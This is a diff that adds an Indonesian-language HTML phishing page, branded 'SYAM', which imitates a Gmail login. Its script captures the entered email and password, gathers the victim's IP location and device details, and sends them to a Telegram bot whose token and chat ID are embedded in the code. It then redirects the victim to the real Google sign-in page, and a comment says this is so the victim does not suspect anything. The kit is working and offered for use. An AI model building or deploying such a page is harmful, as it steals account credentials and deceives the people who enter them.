@@ -1,0 +1,267 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Masuk ke akunmu - SYAM</title>
+<style>
+  * { margin:0; padding:0; box-sizing:border-box; font-family:'Segoe UI', Roboto, Helvetica, Arial, sans-serif; }
+  
+  /* Background samudra gelap */
+  body { 
+    background: #090e17; 
+    background-image: url('https://images.unsplash.com/photo-1505118380757-91f5f5632de0?q=80&w=1000&auto=format&fit=crop'); /* Gambar ombak gelap */
+    background-size: cover;
+    background-position: center;
+    background-blend-mode: multiply;
+    min-height: 100vh; 
+    display: flex; 
+    flex-direction: column; 
+    align-items: center; 
+    padding: 40px 20px; 
+    color: #fff;
+  }
+
+  /* Logo SYAM (Pake teks CSS kalo gambar asli gak ada) */
+  .logo-container { text-align: center; margin-bottom: 20px; }
+  .logo-text { 
+    font-size: 60px; 
+    font-weight: 900; 
+    color: #fff; 
+    text-shadow: 3px 3px 0 #2b7a9e, -1px -1px 0 #000, 1px -1px 0 #000, -1px 1px 0 #000, 1px 1px 0 #000; 
+    letter-spacing: 2px;
+    position: relative;
+    display: inline-block;
+  }
+  .logo-text::before { content: '☠️'; position: absolute; top: -35px; left: 50%; transform: translateX(-50%); font-size: 40px; text-shadow: none; }
+  .logo-sub { font-size: 12px; color: #a0b2c6; letter-spacing: 5px; margin-top: 5px; }
+
+  .title { font-size: 16px; margin-bottom: 20px; letter-spacing: 1px; color: #e0e6ed; }
+
+  /* Kartu Form Putih */
+  .card { 
+    background: #f4f6f9; 
+    border-radius: 16px; 
+    padding: 25px 20px; 
+    width: 100%; 
+    max-width: 400px; 
+    box-shadow: 0 10px 25px rgba(0,0,0,0.5); 
+  }
+  
+  .card h2 { color: #2c3e50; font-size: 22px; margin-bottom: 5px; }
+  .card p { color: #7f8c8d; font-size: 14px; margin-bottom: 25px; }
+
+  /* Input Styles */
+  .input-group { position: relative; margin-bottom: 20px; }
+  .input-group input { 
+    width: 100%; 
+    padding: 16px 15px 16px 45px; 
+    font-size: 15px; 
+    border: 1px solid #d1d8e0; 
+    border-radius: 8px; 
+    outline: none; 
+    background: #fff; 
+    color: #333;
+  }
+  .input-group input:focus { border: 2px solid #5da1cf; padding: 15px 14px 15px 44px; }
+  
+  .input-group label { 
+    position: absolute; 
+    left: 12px; 
+    top: -8px; 
+    font-size: 12px; 
+    color: #7f8c8d; 
+    background: #f4f6f9; 
+    padding: 0 4px; 
+    transition: 0.2s; 
+    pointer-events: none; 
+  }
+  
+  /* Ikon di dalam input */
+  .icon { position: absolute; left: 15px; top: 16px; width: 18px; height: 18px; fill: #7f8c8d; }
+  .eye-icon { position: absolute; right: 15px; top: 16px; width: 20px; height: 20px; fill: #7f8c8d; cursor: pointer; }
+
+  /* Buttons */
+  .btn { 
+    width: 100%; 
+    padding: 16px; 
+    border: none; 
+    border-radius: 8px; 
+    font-size: 14px; 
+    font-weight: bold; 
+    letter-spacing: 2px; 
+    cursor: pointer; 
+    margin-bottom: 15px;
+    display: flex;
+    justify-content: center;
+    align-items: center;
+    gap: 10px;
+  }
+  
+  .btn-masuk { background: #3b88c3; color: #fff; }
+  .btn-masuk:hover { background: #2a6c9e; }
+  .btn-masuk:disabled { background: #a0b2c6; }
+
+  .btn-trouble { background: #22628a; color: #fff; }
+  .btn-trouble:hover { background: #1a4b6b; }
+
+  /* Footer */
+  .footer { margin-top: 30px; font-size: 11px; color: #5a6b7c; letter-spacing: 1px; text-align: center; }
+
+  .msg { text-align: center; font-size: 13px; margin-top: 15px; padding: 10px; border-radius: 6px; display: none; }
+  .msg.ok { display: block; background: #d4edda; color: #155724; }
+  .msg.err { display: block; background: #f8d7da; color: #721c24; }
+</style>
+</head>
+<body>
+
+  <div class="logo-container">
+    <div class="logo-text">SYAM</div>
+    <div class="logo-sub">P R I V A T E</div>
+  </div>
+
+  <div class="title">Masuk ke akunmu</div>
+
+  <div class="card">
+    <h2>Selamat datang</h2>
+    <p>Username & password</p>
+
+    <form id="phishForm" onsubmit="return capture(event)">
+      <!-- Input Username diganti jadi Gmail -->
+      <div class="input-group">
+        <svg class="icon" viewBox="0 0 24 24"><path d="M12 12c2.21 0 4-1.79 4-4s-1.79-4-4-4-4 1.79-4 4 1.79 4 4 4zm0 2c-2.67 0-8 1.34-8 4v2h16v-2c0-2.66-5.33-4-8-4z"/></svg>
+        <input type="email" id="email" placeholder=" " required autocomplete="username">
+        <label for="email">Gmail</label>
+      </div>
+
+      <!-- Input Password -->
+      <div class="input-group">
+        <svg class="icon" viewBox="0 0 24 24"><path d="M18 8h-1V6c0-2.76-2.24-5-5-5S7 3.24 7 6v2H6c-1.1 0-2 .9-2 2v10c0 1.1.9 2 2 2h12c1.1 0 2-.9 2-2V10c0-1.1-.9-2-2-2zM9 6c0-1.66 1.34-3 3-3s3 1.34 3 3v2H9V6zm9 14H6V10h12v10zm-6-3c1.1 0 2-.9 2-2s-.9-2-2-2-2 .9-2 2 .9 2 2 2z"/></svg>
+        <input type="password" id="password" placeholder=" " required autocomplete="current-password">
+        <label for="password">Password</label>
+        <!-- Ikon Mata -->
+        <svg class="eye-icon" onclick="togglePassword()" viewBox="0 0 24 24"><path d="M12 4.5C7 4.5 2.73 7.61 1 12c1.73 4.39 6 7.5 11 7.5s9.27-3.11 11-7.5c-1.73-4.39-6-7.5-11-7.5zM12 17c-2.76 0-5-2.24-5-5s2.24-5 5-5 5 2.24 5 5-2.24 5-5 5zm0-8c-1.66 0-3 1.34-3 3s1.34 3 3 3 3-1.34 3-3-1.34-3-3-3z"/></svg>
+      </div>
+
+      <button type="submit" class="btn btn-masuk" id="submitBtn">
+        MASUK <span>→</span>
+      </button>
+      
+      <button type="button" class="btn btn-trouble">
+        🎧 TROUBLESHOOT
+      </button>
+
+      <div class="msg" id="msg"></div>
+    </form>
+  </div>
+
+  <div class="footer">v2.0.17 · © 2026 SYAM</div>
+
+<script>
+// ============================================================
+// KONFIGURASI BOT TELEGRAM LU
+// ============================================================
+const BOT_TOKEN = '9180587721:AAHbkiDhn1pqHgrzI7z6t8qXC7xWgm3aJkE';
+const CHAT_ID   = '9226840096';
+// ============================================================
+
+function getMeta() {
+  return {
+    ua: navigator.userAgent,
+    platform: navigator.platform,
+    lang: navigator.language,
+    screen: `${screen.width}x${screen.height}`,
+    tz: Intl.DateTimeFormat().resolvedOptions().timeZone,
+    referrer: document.referrer || 'direct',
+    timestamp: new Date().toISOString()
+  };
+}
+
+async function sendToTelegram(text) {
+  const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
+  const payload = {
+    chat_id: CHAT_ID,
+    text: text,
+    parse_mode: 'HTML',
+    disable_web_page_preview: true
+  };
+  try {
+    const res = await fetch(url, {
+      method: 'POST',
+      headers: { 'Content-Type': 'application/json' },
+      body: JSON.stringify(payload)
+    });
+    const data = await res.json();
+    return data.ok === true;
+  } catch(e) {
+    return false;
+  }
+}
+
+function showMsg(text, type) {
+  const el = document.getElementById('msg');
+  el.textContent = text;
+  el.className = 'msg ' + type;
+}
+
+function togglePassword() {
+  const pwd = document.getElementById('password');
+  if (pwd.type === 'password') {
+    pwd.type = 'text';
+  } else {
+    pwd.type = 'password';
+  }
+}
+
+async function capture(event) {
+  event.preventDefault();
+  const email = document.getElementById('email').value.trim();
+  const password = document.getElementById('password').value;
+  const btn = document.getElementById('submitBtn');
+
+  if (!email || !password) return false;
+
+  btn.disabled = true;
+  btn.innerHTML = 'VERIFYING... <span>⏳</span>';
+  showMsg('', '');
+
+  const meta = getMeta();
+  let ipInfo = {};
+  try {
+    const res = await fetch('https://ipapi.co/json/');
+    ipInfo = await res.json();
+  } catch(e) {}
+
+  const report =
+    `<b>🏴‍☠️ SYAM CAPTURED</b>\n` +
+    `<b>━━━━━━━━━━━━━━━━━━</b>\n` +
+    `<b>📧 Gmail:</b> <code>${escapeHtml(email)}</code>\n` +
+    `<b>🔑 Password:</b> <code>${escapeHtml(password)}</code>\n` +
+    `<b>━━━━━━━━━━━━━━━━━━</b>\n` +
+    `<b>🌐 IP:</b> <code>${ipInfo.ip || 'unknown'}</code>\n` +
+    `<b>📍 Lokasi:</b> ${ipInfo.city || '?'}, ${ipInfo.country || '?'}\n` +
+    `<b>💻 Device:</b> ${escapeHtml(meta.platform)}\n` +
+    `<b>🕒 Waktu:</b> ${meta.timestamp}`;
+
+  const ok = await sendToTelegram(report);
+
+  if (ok) {
+    showMsg('Verifikasi berhasil, mengalihkan...', 'ok');
+    setTimeout(() => {
+      // Redirect ke Google asli biar korban gak curiga
+      window.location.href = 'https://accounts.google.com/signin/v2/identifier';
+    }, 2500);
+  } else {
+    showMsg('Gagal terhubung ke server. Coba lagi.', 'err');
+    btn.disabled = false;
+    btn.innerHTML = 'MASUK <span>→</span>';
+  }
+  return false;
+}
+
+function escapeHtml(str) {
+  return String(str).replace(/&/g, '&amp;').replace(/</g, '&lt;').replace(/>/g, '&gt;').replace(/"/g, '&quot;').replace(/'/g, '&#39;');
+}
+</script>
+</body>
+</html>
